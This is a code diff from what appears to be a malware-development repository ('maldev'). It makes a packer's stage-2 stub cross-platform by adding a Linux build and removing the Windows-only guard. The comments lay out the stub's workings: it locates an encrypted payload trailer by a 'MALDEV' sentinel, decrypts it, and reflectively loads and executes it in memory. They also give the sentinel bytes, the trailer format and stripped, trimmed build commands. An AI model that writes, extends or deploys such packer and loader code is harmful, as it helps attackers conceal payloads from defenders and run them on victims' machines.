@@ -1,9 +1,16 @@
 //go:build ignore
 
-// stage2_main.go is the source of the pe/packer/stubgen Phase 1e-A
-// stage-2 stub. The compiled binary becomes stage2_vNN.exe and is
-// committed to the repo. It is excluded from `go build ./...` by
-// the //go:build ignore tag above; use the Makefile to build it.
+// stage2_main.go is the cross-platform source of the pe/packer/stubgen
+// stage-2 stubs. The compiled binary is committed to the repo as
+// stage2_vNN.exe (Windows) or stage2_linux_vNN (Linux). It is excluded
+// from `go build ./...` by the //go:build ignore tag above; use the
+// Makefile to build variants.
+//
+// Cross-platform: Phase 1e-A produced stage2_v01.exe (Windows PE32+);
+// Phase 1e-B produces stage2_linux_v01 (Linux ELF64 static-PIE).
+// runtime.LoadPE dispatches to the correct mapper on each OS via Phase
+// 1f Stage C+D (Windows) and Stage E (Linux), so the stage-2 source
+// itself requires no OS-specific branching.
 //
 // At runtime stage 2:
 //  1. Locates the encrypted payload trailer via the sentinel bytes
@@ -14,7 +21,7 @@
 //  4. Calls runtime.LoadPE to reflectively load and execute the
 //     original payload via JMP to its OEP.
 //
-// Sentinel (Task 8 — stubgen.go — must use the same value):
+// Sentinel (stubgen.go — must use the same value):
 //
 //	[4D 41 4C 44 45 56 01 01 50 59 31 45 30 30 41 00]  ("MALDEV\x01\x01PY1E00A\x00")
 //
@@ -22,12 +29,19 @@
 //
 //	[16 bytes sentinel] [u64 payloadLen LE] [u64 keyLen LE] [payload] [key]
 //
-// Build:
+// Build (Windows):
 //
 //	CGO_ENABLED=0 GOOS=windows GOARCH=amd64 \
 //	  go build -trimpath \
 //	  -ldflags='-s -w -buildid=' \
 //	  -o stage2_v01.exe ./stage2_main.go
+//
+// Build (Linux):
+//
+//	CGO_ENABLED=0 GOOS=linux GOARCH=amd64 \
+//	  go build -trimpath -buildmode=pie \
+//	  -ldflags='-s -w -buildid=' \
+//	  -o stage2_linux_v01 ./stage2_main.go
 package main
 
 import (
@@ -35,7 +49,6 @@ import (
 	"encoding/binary"
 	"fmt"
 	"os"
-	"runtime"
 
 	pkgrt "github.com/oioio-space/maldev/pe/packer/runtime"
 )
@@ -100,13 +113,6 @@ func main() {
 	}
 	payload := self[dataOff : uint64(dataOff)+payloadLen]
 	key := self[uint64(dataOff)+payloadLen : uint64(dataOff)+totalData]
-
-	// Stage 2 targets Windows exclusively for Phase 1e-A. Other OS
-	// stubs (Linux ELF, Darwin) are separate efforts (Phase 1e-B+).
-	if runtime.GOOS != "windows" {
-		fmt.Fprintln(os.Stderr, "stage2: Phase 1e-A targets Windows hosts only")
-		os.Exit(2)
-	}
 
 	img, err := pkgrt.LoadPE(payload, key)
 	if err != nil {
